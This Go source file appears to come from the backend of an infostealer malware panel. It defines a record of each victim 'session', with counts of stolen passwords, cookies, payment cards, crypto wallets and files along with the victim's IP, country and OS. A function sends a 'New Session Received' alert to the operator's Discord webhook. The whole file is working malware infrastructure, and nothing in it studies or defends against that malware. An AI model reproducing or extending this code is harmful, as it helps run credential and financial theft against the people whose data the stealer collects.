package services

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"time"
)

type SessionSummary struct {
	SessionID   string
	CountryCode string
	Passwords   int
	Cookies     int
	Cards       int
	Wallets     int
	Files       int
	Os          string
	IP          string
	BuildID     string
	BuildTag    string
}

type discordEmbed struct {
	Title       string              `json:"title"`
	Description string              `json:"description"`
	Color       int                 `json:"color"`
	Fields      []discordEmbedField `json:"fields"`
	Timestamp   string              `json:"timestamp"`
}

type discordEmbedField struct {
	Name   string `json:"name"`
	Value  string `json:"value"`
	Inline bool   `json:"inline"`
}

type discordWebhookBody struct {
	Content string         `json:"content,omitempty"`
	Embeds  []discordEmbed `json:"embeds,omitempty"`
}

func SendDiscordNotification(webhookURL string, session SessionSummary) error {
	if !isSafeWebhookURL(webhookURL) {
		return fmt.Errorf("discord webhook url not allowed: %s", webhookURL)
	}
	color := 0x00ff00
	if session.Passwords == 0 && session.Cookies == 0 && session.Cards == 0 {
		color = 0xffa500
	}

	embed := discordEmbed{
		Title:       "New Session Received",
		Description: fmt.Sprintf("Session **%s**", session.SessionID[:8]),
		Color:       color,
		Timestamp:   time.Now().UTC().Format(time.RFC3339),
		Fields: []discordEmbedField{
			{Name: "Country", Value: session.CountryCode, Inline: true},
			{Name: "IP", Value: session.IP, Inline: true},
			{Name: "OS", Value: session.Os, Inline: true},
			{Name: "Passwords", Value: fmt.Sprintf("%d", session.Passwords), Inline: true},
			{Name: "Cookies", Value: fmt.Sprintf("%d", session.Cookies), Inline: true},
			{Name: "Cards", Value: fmt.Sprintf("%d", session.Cards), Inline: true},
			{Name: "Wallets", Value: fmt.Sprintf("%d", session.Wallets), Inline: true},
			{Name: "Files", Value: fmt.Sprintf("%d", session.Files), Inline: true},
		},
	}

	if session.BuildTag != "" {
		embed.Fields = append(embed.Fields, discordEmbedField{Name: "Build Tag", Value: session.BuildTag, Inline: true})
	}

	body := discordWebhookBody{Embeds: []discordEmbed{embed}}

	data, err := json.Marshal(body)
	if err != nil {
		return fmt.Errorf("marshal discord payload: %w", err)
	}

	resp, err := http.Post(webhookURL, "application/json", bytes.NewReader(data))
	if err != nil {
		return fmt.Errorf("send discord: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Errorf("discord webhook returned status %d", resp.StatusCode)
	}

	return nil
}
